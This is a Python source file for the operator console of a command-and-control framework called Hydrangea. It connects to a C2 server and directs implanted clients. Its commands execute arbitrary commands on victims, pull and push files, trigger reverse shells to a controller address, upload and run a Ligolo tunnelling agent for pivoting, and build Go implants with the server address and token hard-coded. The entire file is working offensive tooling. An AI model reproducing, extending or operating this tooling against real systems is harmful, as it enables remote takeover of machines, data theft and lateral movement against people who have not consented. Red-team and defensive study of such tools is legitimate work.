#!/usr/bin/env python3

import argparse
import asyncio
import json
import os
import shlex
import sys
import subprocess
from typing import Dict, Optional, Tuple

from utils.common import write_frame, read_frame
from utils.go_builder import build_go_clients
from utils.controller_ui import *

__version__ = "3.0"

# ---------- wire ----------
async def admin_send(
    host: str, port: int, auth_token: str, header: dict, payload: bytes = b""
):
    reader, writer = await asyncio.open_connection(host, port)
    admin_header = {"type": "ADMIN", "token": auth_token}
    admin_header.update(header)
    await write_frame(writer, admin_header, payload)
    resp, resp_payload = await read_frame(reader)
    writer.close()
    await writer.wait_closed()
    return resp, resp_payload


class NoExitArgumentParser(argparse.ArgumentParser):
    def error(self, message):  # don't sys.exit; raise for REPL handling
        raise ValueError(message)


def build_repl_parser() -> Tuple[
    argparse.ArgumentParser, Dict[str, argparse.ArgumentParser]
]:
    p = NoExitArgumentParser(prog=">>")
    sub = p.add_subparsers(dest="cmd")

    # context commands
    sp = sub.add_parser("use", help="Set the active client for subsequent commands")
    sp.add_argument("client", help="Client ID to use")

    sp = sub.add_parser("unuse", help="Clear the active client (or only if it matches)")
    sp.add_argument(
        "client", nargs="?", help="Optional client ID to unuse (must match current)"
    )

    # regular commands (client optional in REPL; will use active context)
    sub.add_parser("clients", help="List connected clients")

    sp = sub.add_parser("ping", help="Ping a client")
    sp.add_argument("--client", required=False)

    sp = sub.add_parser("list", help="List directory on client")
    sp.add_argument("--client", required=False)
    sp.add_argument("--path", default=".")
    sp.add_argument("--wait", action="store_true", help="Wait for result and render")
    sp.add_argument(
        "--timeout", type=float, default=10.0, help="Seconds to wait when --wait"
    )

    sp = sub.add_parser("pull", help="Pull a file from client to server")
    sp.add_argument("--client", required=False)
    sp.add_argument("--src", required=True)
    sp.add_argument("--dest", required=True)

    sp = sub.add_parser("push", help="Push a local file to client")
    sp.add_argument("--client", required=False)
    sp.add_argument("--src", required=True, help="Local path to send")
    sp.add_argument("--dest", required=True, help="Destination path on client")

    sp = sub.add_parser("exec", help="Execute a command on the client")
    sp.add_argument("--client", required=False)
    sp.add_argument(
        "--command",
        required=True,
        help='Command string or JSON list (e.g. "[\\"ls\\",\\"-la\\"]")',
    )
    sp.add_argument("--shell", action="store_true", help="Run via shell")
    sp.add_argument("--cwd", help="Working directory on client")
    sp.add_argument(
        "--timeout", type=float, default=30.0, help="Seconds to wait for command"
    )

    sp = sub.add_parser("session", help="Fetch session info from client")
    sp.add_argument("--client", required=False)
    sp.add_argument("--timeout", type=float, default=1)

    # build-client (REPL)
    sp = sub.add_parser(
        "build-client",
        help="Compile Go clients from ./client/go with hard-coded server details",
    )
    sp.add_argument("--server-host", default=None)
    sp.add_argument("--server-port", type=int, default=None)
    sp.add_argument("--build-auth-token", default=None)
    sp.add_argument("--client-id", default=None)
    sp.add_argument("--out", default="./dist")
    sp.add_argument("--os", action="append", choices=["linux", "windows"])
    sp.add_argument("--arch", default="amd64", choices=["amd64", "arm64"])

    # server-status (REPL)
    sub.add_parser("server-status", help="Check the server's health status")

    # meta
    sub.add_parser("help", help="Show help or 'help <command>'")
    sub.add_parser("quit", help="Exit the console")
    sub.add_parser("exit", help="Exit the console")

    # reverse-shell (REPL)
    sp = sub.add_parser("reverse-shell", help="Start a reverse shell to the controller")
    sp.add_argument("controller_addr", help="Controller address (host:port)")
    sp.add_argument("--client", required=False)

    # port-forward (REPL)
    sp = sub.add_parser(
        "port-forward",
        help="Upload and run Ligolo agent for port forwarding",
    )
    sp.add_argument("--ligolo-path", required=True, help="Path to Ligolo agent binary")
    sp.add_argument(
        "--connect-args",
        required=True,
        help="Arguments passed after --connect, e.g. '127.0.0.1:1000 -slefcert'",
    )
    sp.add_argument("--client", required=False)

    sp = sub.add_parser("local", help="Run a local shell command")
    sp.add_argument("local_command", help="Local command to run")

    # Return also a mapping for subparser lookups (for help display)
    subparsers_map = {a.dest: a for a in []}  # placeholder for type clarity
    return p, {sp_prog(p): p for p in sub._name_parser_map.values()}


def sp_prog(p: argparse.ArgumentParser) -> str:
    # Retrieve the subparser's program name (command) robustly
    # argparse stores it in .prog; last token is the subcommand
    return p.prog.split()[-1]


# Optional: minimal readline support (history + command completion for verbs)
try:
    import readline  # type: ignore

    def _setup_readline(commands):
        def completer(text, state):
            options = [c for c in commands if c.startswith(text)]
            if state < len(options):
                return options[state]
            return None

        readline.set_completer(completer)
        readline.parse_and_bind("tab: complete")
        histfile = os.path.expanduser("~/.hydrangea_history")
        try:
            readline.read_history_file(histfile)
        except Exception:
            pass
        import atexit

        atexit.register(lambda: _save_history(histfile))

    def _save_history(path):
        try:
            readline.write_history_file(path)
        except Exception:
            pass
except Exception:
    readline = None

    def _setup_readline(_):
        return


# ---------- REPL loop ----------
async def run_repl(args) -> None:
    ui = UI(
        use_color=(not args.no_color), show_banner=(not args.no_banner), quiet=False
    )
    
    # Create enhanced UI helper
    enhanced_ui = create_enhanced_ui(ui)
    client_formatter = EnhancedClientFormatter(ui)
    
    # Show welcome screen
    enhanced_ui.show_welcome_screen(__version__, args.host, args.port)

    repl_parser, sub_map = build_repl_parser()
    commands = sorted([k for k in sub_map.keys() if k not in {"help"}]) + [
        "help",
        "quit",
        "exit",
    ]

    # active client context
    current_client: Optional[str] = None

    _setup_readline(commands)

    while True:
        enhanced_ui.show_status_bar(args.host, args.port, current_client)
        try:
            line = enhanced_ui.show_command_prompt()
        except (EOFError, KeyboardInterrupt):
            enhanced_ui.show_goodbye_message()
            return

        if not line:
            continue

        if line.startswith("#"):
            continue

        # Track command usage
        enhanced_ui.increment_command_count()

        if line.lower() in {"help", "?"}:
            enhanced_ui.show_help_menu(commands, sub_map)
            continue

        if line.lower().startswith("help "):
            _, _, cmd = line.partition(" ")
            sp = sub_map.get(cmd.strip())
            if not sp:
                enhanced_ui.show_error_with_suggestions(f"Unknown command: {cmd}", ["Type 'help' to see all commands"])
                continue
            enhanced_ui.show_command_help(cmd.strip(), sp)
            continue

        if line.lower() in {"quit", "exit", "ciao", "bisous"}:
            enhanced_ui.show_goodbye_message()
            return

        # Parse via argparse
        try:
            ns = repl_parser.parse_args(shlex.split(line))
        except ValueError as e:
            print(ui.TAG_ERR, str(e))
            continue
        except SystemExit:
            continue

        cmd = getattr(ns, "cmd", None)
        if not cmd:
            print(ui.TAG_ERR, "No command parsed. Type 'help'.")
            continue

        # ---- context commands ----
        if cmd == "use":
            prev = current_client
            current_client = ns.client.strip()
            enhanced_ui.show_client_switch_notification(prev, current_client)
            continue

        if cmd == "unuse":
            if ns.client and current_client and ns.client != current_client:
                print(
                    f"{ui.TAG_INF} current is {ui.c(current_client, 'bold')}; did not unuse {ui.c(ns.client, 'bold')}"
                )
                continue
            enhanced_ui.show_client_clear_notification(current_client)
            current_client = None
            ui.rule()
            continue

        # helper to resolve client in REPL (flag or active)
        def _resolve_client(flag_value: Optional[str]) -> Optional[str]:
            return flag_value or current_client

        # ---- dispatch regular commands ----
        if cmd == "clients":
            resp, _ = await admin_send(
                args.host, args.port, args.auth_token, {"action": "clients"}
            )
            if resp.get("type") == "CLIENTS":
                clients = resp.get("clients", [])
                client_formatter.format_clients_table(clients)
            else:
                print_error(ui, resp)
            continue

        if cmd == "ping":
            target = _resolve_client(ns.client)
            if not target:
                enhanced_ui.show_no_client_error()
                continue
            resp, _ = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {"action": "ping", "target_id": target},
            )
            if resp.get("type") == "OK":
                enhanced_ui.show_operation_success("Ping sent", target)
            else:
                print_error(ui, resp)
            continue

        if cmd == "list":
            target = _resolve_client(ns.client)
            if not target:
                enhanced_ui.show_no_client_error()
                continue
            resp, payload = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {
                    "action": "list",
                    "target_id": target,
                    "path": ns.path,
                    "wait": ns.wait,
                    "timeout": ns.timeout,
                },
            )
            if ns.wait:
                print_list(ui, ns.path, resp, payload)
            else:
                print_queued(ui, resp)
            continue

        if cmd == "pull":
            target = _resolve_client(ns.client)
            if not target:
                enhanced_ui.show_no_client_error()
                continue
            
            enhanced_ui.show_file_transfer_info("File Pull", ns.src, ns.dest, target)
            
            resp, _ = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {"action": "pull", "target_id": target, "src": ns.src, "dest": ns.dest},
            )
            if resp.get("type") == "QUEUED":
                enhanced_ui.show_operation_queued("File transfer", target, f"{ns.src} → {ns.dest}")
                hint = f"{ui.c('📁 Note:', 'dim')} File will appear in server storage when client completes"
                print(f"{ui.TAG_INF} {hint}")
            else:
                print_error(ui, resp)
            continue

        if cmd == "push":
            target = _resolve_client(ns.client)
            if not target:
                enhanced_ui.show_no_client_error()
                continue
            if not os.path.isfile(ns.src):
                enhanced_ui.show_error_with_suggestions(
                    f"Local file not found: {ns.src}",
                    ["Check the file path", "Ensure the file exists", "Use absolute or relative path"]
                )
                continue
            
            enhanced_ui.show_file_transfer_info("File Push", ns.src, ns.dest, target)
            
            try:
                with open(ns.src, "rb") as f:
                    data = f.read()
            except Exception as e:
                enhanced_ui.show_error_with_suggestions(f"Cannot read {ns.src}: {e}")
                continue
            resp, _ = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {
                    "action": "push",
                    "target_id": target,
                    "dest": ns.dest,
                    "src_name": os.path.basename(ns.src),
                },
                data,
            )
            if resp.get("type") == "QUEUED":
                enhanced_ui.show_operation_queued("File upload", target, f"{ns.src} → {ns.dest}")
            else:
                print_error(ui, resp)
            continue

        if cmd == "exec":
            target = _resolve_client(ns.client)
            if not target:
                enhanced_ui.show_no_client_error()
                continue
            cmd_value = ns.command
            try:
                cmd_value = json.loads(cmd_value)  # allow JSON list
            except Exception:
                pass
            resp, payload = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {
                    "action": "exec",
                    "target_id": target,
                    "cmd": cmd_value,
                    "shell": ns.shell,
                    "cwd": ns.cwd,
                    "timeout": ns.timeout,
                },
            )
            print_exec(ui, target, resp, payload)
            continue

        if cmd == "session":
            target = _resolve_client(ns.client)
            if not target:
                enhanced_ui.show_no_client_error()
                continue
            resp, payload = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {"action": "session_info", "target_id": target, "timeout": ns.timeout},
            )
            if resp.get("type") == "RESULT_SESSION_INFO":
                try:
                    info = json.loads(payload.decode("utf-8")) if payload else {}
                    enhanced_ui.show_session_summary(target, info)
                except Exception:
                    print_session(ui, target, resp, payload)
            else:
                print_error(ui, resp)
            continue

        if cmd == "build-client":
            # inherit controller defaults if not provided
            if ns.server_host is None:
                ns.server_host = args.host
            if ns.server_port is None:
                ns.server_port = args.port
            if ns.build_auth_token is None:
                ns.build_auth_token = args.auth_token
            
            # Show build configuration
            build_config = {
                "server_host": ns.server_host,
                "server_port": ns.server_port,
                "client_id": ns.client_id,
                "out": ns.out,
                "os": ns.os,
                "arch": ns.arch
            }
            enhanced_ui.show_build_summary(build_config)
            
            try:
                build_go_clients(ui, ns)
            except Exception as e:
                enhanced_ui.show_error_with_suggestions(
                    f"Build error: {e}",
                    ["Check Go installation", "Verify client source code exists", "Check output directory permissions"]
                )
            continue

        if cmd == "server-status":
            resp, _ = await admin_send(
                args.host, args.port, args.auth_token, {"action": "health_status"}
            )
            if resp.get("type") == "HEALTH_STATUS":
                enhanced_ui.show_server_health(resp)
            else:
                print_error(ui, resp)
            continue

        # ---- reverse shell ----
        if cmd == "reverse-shell":
            controller_addr = ns.controller_addr
            target = _resolve_client(getattr(ns, "client", None))
            if not controller_addr:
                enhanced_ui.show_error_with_suggestions("Controller address required (host:port)")
                continue
            if not target:
                enhanced_ui.show_no_client_error()
                continue
            resp, _ = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {"action": "reverse_shell", "target_id": target, "controller_addr": controller_addr},
            )
            if resp.get("type") == "QUEUED":
                enhanced_ui.show_operation_queued("Reverse shell", target, f"→ {controller_addr}")
                print(f"{ui.TAG_INF} 🌐 Open a listener on {ui.c(controller_addr, 'bold')} to receive the shell")
            else:
                print_error(ui, resp)
            continue

        # ---- port forward ----
        if cmd == "port-forward":
            ligolo_path = ns.ligolo_path
            connect_args = ns.connect_args
            target = _resolve_client(getattr(ns, "client", None))
            if not target:
                enhanced_ui.show_no_client_error()
                continue
            if not os.path.isfile(ligolo_path):
                enhanced_ui.show_error_with_suggestions(
                    "Ligolo agent binary not found",
                    ["Verify --ligolo-path", "Check file permissions"],
                )
                continue
            try:
                with open(ligolo_path, "rb") as f:
                    payload = f.read()
            except Exception as e:
                enhanced_ui.show_error_with_suggestions(f"Failed to read binary: {e}")
                continue
            filename = os.path.basename(ligolo_path)

            # Step 1: upload the agent to the target
            resp, _ = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {
                    "action": "push",
                    "target_id": target,
                    "dest": filename,
                    "src_name": filename,
                },
                payload,
            )
            if resp.get("type") != "QUEUED":
                print_error(ui, resp)
                continue
            enhanced_ui.show_operation_queued("File upload", target, filename)

            # Step 2: run the uploaded agent
            resp, _ = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {
                    "action": "port_forward",
                    "target_id": target,
                    "filename": filename,
                    "connect_args": connect_args,
                },
            )
            if resp.get("type") == "QUEUED":
                enhanced_ui.show_operation_queued("Port forward", target, filename)
            else:
                print_error(ui, resp)
            continue

        if cmd == "local":
            local_command = ns.local_command
            try:
                proc = subprocess.Popen(local_command, shell=True)
                enhanced_ui.show_operation_success("Local command started", f"PID {proc.pid}")
                # wait for the command to finish
                proc.wait()
                enhanced_ui.show_operation_success("Local command finished", f"PID {proc.pid}")
                ui.rule()
            except Exception as e:
                enhanced_ui.show_error_with_suggestions(f"Failed to start local command: {e}")
                ui.rule()
            continue

        enhanced_ui.show_error_with_suggestions(
            f"Unknown command: {cmd}", 
            ["Type 'help' to see available commands", "Check command spelling"]
        )



def start_server(args):
    ui = UI(
        use_color=(not args.no_color),
        show_banner=(not args.no_banner),
        quiet=args.quiet,
    )
    ui.rule(" start server ")
    ui.headline(f"{ui.TAG_INF} Starting Hydrangea server...")
    ui.kv("Host", args.host)
    ui.kv("Port", args.port)
    ui.kv("Auth Token", args.auth_token)
    ui.hr()
    cmd = [
        sys.executable,
        "Hydrangea-server.py",
        "--host",
        args.host,
        "--port",
        str(args.port),
        "--auth-token",
        args.auth_token,
    ]
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        ui.headline(f"{ui.TAG_OK} Server process started (PID {proc.pid})")
    except Exception as e:
        ui.headline(f"{ui.TAG_ERR} Failed to start server: {e}")
    ui.rule()


# ---------- CLI ----------


async def main():
    ap = argparse.ArgumentParser(description="Hydrangea C2 controller")
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--auth-token", required=True)
    ap.add_argument(
        "--start-srv", action="store_true", help="Start server with given parameters"
    )

    # UI flags
    ap.add_argument("--no-color", action="store_true", help="Disable ANSI colors")
    ap.add_argument("--no-banner", action="store_true", help="Hide ASCII banner")
    ap.add_argument("--quiet", action="store_true", help="Less chatter")
    args = ap.parse_args()

    if args.start_srv:
        start_server(args)

    await run_repl(args)


if __name__ == "__main__":
    asyncio.run(main())
